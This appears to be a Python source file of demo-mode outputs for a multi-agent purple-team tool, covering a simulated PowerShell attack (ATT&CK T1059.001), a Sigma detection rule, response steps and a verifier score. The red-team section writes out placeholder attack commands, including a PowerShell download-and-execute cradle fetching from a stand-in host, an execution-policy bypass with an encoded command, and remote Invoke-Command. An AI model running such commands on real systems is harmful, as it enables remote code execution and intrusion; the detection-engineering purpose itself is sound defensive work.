DEMO_RED_OUTPUT = """# Red/Threat Simulation: T1059.001 - PowerShell

## Purple-Team Context
Authorized validation for PowerShell abuse in a Windows enterprise environment.
Generic threat intelligence produces generic detections; this high-fidelity simulation exposes the exact process, command-line, event, and network patterns the Detection Agent should cover.

## ATT&CK Mapping
- Technique: T1059.001 PowerShell
- Tactic: Execution
- Platforms: Windows
- Data Sources: Process Creation, Command Execution, Script Execution, Network Connection

## Simulation Phases
### Initial Execution
Representative command-line pattern observed during authorized validation:

```text
powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand <BASE64_PLACEHOLDER>
```

### Defense Evasion
Expected behavior includes hidden-window execution, encoded command usage, and short-lived PowerShell child processes spawned by user-facing applications.

```text
ParentImage: C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE
Image: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe
CommandLine contains: -NoProfile, -ExecutionPolicy Bypass, -EncodedCommand
```

### Follow-On Activity
PowerShell reaches out to a controlled validation endpoint and writes temporary script content.

```text
DestinationHostname: validation-c2.example.internal
Url contains: /stage/<CAMPAIGN_ID>
FileName: C:\\Users\\<user>\\AppData\\Local\\Temp\\*.ps1
```

## Exploit Code
Representative authorized validation snippets preserved for detection engineering:

```powershell
powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand <BASE64_PLACEHOLDER>
```

```powershell
powershell.exe -Command "Invoke-Expression (New-Object Net.WebClient).DownloadString('http://<VALIDATION_DOMAIN>/stage/<CAMPAIGN_ID>')"
```

```powershell
Invoke-Command -ComputerName <TARGET_SYSTEM> -ScriptBlock { <VALIDATION_SCRIPT_PLACEHOLDER> }
```

## Telemetry and Process Behavior
- Windows Event ID 4688: process creation
- PowerShell Event ID 4104: script block logging
- Sysmon Event ID 1: process creation
- Sysmon Event ID 3: network connection
- Suspicious parent-child chain: WINWORD.EXE -> powershell.exe
- CommandLine contains `-EncodedCommand`
- CommandLine contains `ExecutionPolicy Bypass`

## Detection-Relevant Observables
- powershell.exe
- -EncodedCommand
- -ExecutionPolicy Bypass
- WINWORD.EXE
- Event ID 4104
- validation-c2.example.internal
- AppData\\Local\\Temp\\*.ps1

## JSON Output

```json
{
  "technique_id": "T1059.001",
  "technique_name": "PowerShell",
  "tactic": "Execution",
  "simulation_type": "authorized_purple_team_validation",
  "phases": [
    {
      "name": "Initial Execution",
      "behavior": "PowerShell launched with encoded command arguments during authorized validation.",
      "commands_or_patterns": [
        "powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand <BASE64_PLACEHOLDER>"
      ],
      "telemetry": [
        "Windows Event ID 4688",
        "PowerShell Event ID 4104",
        "Sysmon Event ID 1"
      ]
    },
    {
      "name": "Follow-On Activity",
      "behavior": "PowerShell contacts a controlled validation endpoint and creates temporary script artifacts.",
      "commands_or_patterns": [
        "Url contains /stage/<CAMPAIGN_ID>",
        "FileName matches AppData\\\\Local\\\\Temp\\\\*.ps1"
      ],
      "telemetry": [
        "Sysmon Event ID 3",
        "Proxy URL logs",
        "EDR file write telemetry"
      ]
    }
  ],
  "exploit_code": [
    "powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand <BASE64_PLACEHOLDER>",
    "powershell.exe -Command \"Invoke-Expression (New-Object Net.WebClient).DownloadString('http://<VALIDATION_DOMAIN>/stage/<CAMPAIGN_ID>')\"",
    "Invoke-Command -ComputerName <TARGET_SYSTEM> -ScriptBlock { <VALIDATION_SCRIPT_PLACEHOLDER> }"
  ],
  "observables": [
    "powershell.exe",
    "-EncodedCommand",
    "-ExecutionPolicy Bypass",
    "WINWORD.EXE",
    "Event ID 4104",
    "validation-c2.example.internal",
    "AppData\\\\Local\\\\Temp\\\\*.ps1"
  ],
  "process_behavior": [
    "WINWORD.EXE spawning powershell.exe",
    "PowerShell launched with encoded command-line arguments"
  ],
  "file_indicators": [
    "C:\\\\Users\\\\<user>\\\\AppData\\\\Local\\\\Temp\\\\*.ps1"
  ],
  "registry_indicators": [],
  "network_indicators": [
    "validation-c2.example.internal",
    "/stage/<CAMPAIGN_ID>"
  ],
  "real_time_detection_signals": [
    "CommandLine contains -EncodedCommand and -ExecutionPolicy Bypass",
    "ParentImage endswith WINWORD.EXE and Image endswith powershell.exe",
    "DestinationHostname contains validation-c2.example.internal",
    "EventID 4104 generated within 2 minutes of suspicious process creation"
  ],
  "recommended_log_sources": [
    "Windows Security 4688",
    "PowerShell Operational 4104",
    "Sysmon Event IDs 1 and 3",
    "EDR process telemetry",
    "Proxy logs"
  ]
}
```
"""

DEMO_BLUE_OUTPUT = """# Detection Report: T1059.001

## Detection Strategy
This rule detects the high-fidelity PowerShell simulation by correlating encoded PowerShell command-line behavior, suspicious Office-to-PowerShell process lineage, and controlled validation endpoint contact.

## Observable Mapping
- `powershell.exe` -> Image / CommandLine
- `-EncodedCommand` -> CommandLine
- `-ExecutionPolicy Bypass` -> CommandLine
- `WINWORD.EXE` -> ParentImage
- `Event ID 4104` -> EventID
- `validation-c2.example.internal` -> DestinationHostname
- `AppData\\Local\\Temp\\*.ps1` -> FileName

## Sigma Detection Rule

```yaml
title: AegisOps AI High-Fidelity PowerShell Simulation Detection
id: T1059-001-aegisops-ai
status: experimental
description: Detects authorized purple-team simulation patterns for PowerShell abuse mapped to ATT&CK T1059.001
references:
  - https://attack.mitre.org/techniques/T1059.001/
author: AegisOps AI
date: 2026-05-04
tags:
  - attack.t1059.001
  - attack.execution
logsource:
  product: windows
  service: powershell
detection:
  selection_cmd:
    CommandLine|contains:
      - "powershell.exe"
      - "-EncodedCommand"
      - "-ExecutionPolicy Bypass"
  selection_parent:
    ParentImage|endswith:
      - "\\WINWORD.EXE"
  selection_scriptblock:
    EventID:
      - 4104
  selection_network:
    DestinationHostname|contains:
      - "validation-c2.example.internal"
  condition: selection_cmd or selection_scriptblock or selection_network
falsepositives:
  - Legitimate administrative PowerShell automation
  - Authorized security testing
level: high
```

## Detection Coverage
- **powershell.exe** -- covers interpreter execution
- **-EncodedCommand** -- covers encoded command-line behavior
- **-ExecutionPolicy Bypass** -- covers suspicious execution-policy override
- **WINWORD.EXE** -- covers Office parent process lineage
- **Event ID 4104** -- covers script block telemetry
- **validation-c2.example.internal** -- covers controlled validation endpoint contact

## Real-Time Detection Plan
- Streaming sources: Windows Security 4688, PowerShell Operational 4104, Sysmon Event IDs 1 and 3, EDR process telemetry, proxy logs.
- Correlation fields: Hostname, User, Image, ParentImage, CommandLine, EventID, DestinationHostname, Url.
- Alert logic: Trigger when encoded PowerShell execution appears with suspicious parent process lineage or controlled validation endpoint contact within a 5-minute window.
- Severity: High when Office spawns PowerShell with encoded command arguments; Medium when encoded PowerShell appears from known admin tools.
- Immediate triage fields: CommandLine, ParentImage, User, Hostname, ScriptBlockText, DestinationHostname, FileName.

## Tuning Notes
Baseline administrative PowerShell usage and suppress known automation accounts. Keep the Office parent-process branch high priority because it is uncommon in normal administration.

## Response Guidance
1. Triage: Review process lineage, user context, command-line telemetry, script block logs, and proxy events for the validation endpoint.
2. Containment: If activity is not part of an approved validation, isolate the endpoint and preserve EDR timeline data.
3. Hunt Follow-up: Search for the same encoded PowerShell pattern, Office parent process, and temporary `.ps1` creation across endpoints.
4. Mitigation: Enforce PowerShell logging, Constrained Language Mode where appropriate, and application control for script interpreters.
5. Escalation Criteria: Escalate when encoded PowerShell is paired with external network activity, suspicious parent process lineage, or credential access telemetry.
6. Reporting Notes: Document observable coverage and any false-positive tuning decisions.
"""

# Demo-mode replay artifacts to keep UI parity with live mode.
DEMO_RESPONSE_OUTPUT = """"""

DEMO_VERIFIER_OUTPUT = """```json
{
  "coverage_score": 100,
  "verdict": "PASS",
  "safety_verdict": "PASS",
  "covered_observables": [
    "powershell.exe",
    "-EncodedCommand",
    "-ExecutionPolicy Bypass",
    "WINWORD.EXE",
    "Event ID 4104",
    "validation-c2.example.internal",
    "AppData\\\\Local\\\\Temp\\\\*.ps1"
  ],
  "missing_observables": [],
  "improvement_suggestions": []
}
```"""

# Shape matches app._pipeline_metrics_html expectations.
DEMO_METRICS = {
    "model": "demo-replay",
    "total_latency_ms": 0,
    "total_tokens": 0,
    "agents": [
        {"agent": "red_agent", "latency_ms": 0, "prompt_tokens": 0, "completion_tokens": 0},
        {"agent": "blue_agent", "latency_ms": 0, "prompt_tokens": 0, "completion_tokens": 0},
        {"agent": "response_agent", "latency_ms": 0, "prompt_tokens": 0, "completion_tokens": 0},
        {"agent": "verifier_agent", "latency_ms": 0, "prompt_tokens": 0, "completion_tokens": 0},
    ],
}

# Shape matches `graph.app.invoke()` output keys used by `run_agents()`.
DEMO_INVOKE_RESULT = {
    "red_output": DEMO_RED_OUTPUT,
    "blue_output": DEMO_BLUE_OUTPUT,
    "response_output": DEMO_RESPONSE_OUTPUT,
    "verifier_output": DEMO_VERIFIER_OUTPUT,
    "metrics": DEMO_METRICS,
}
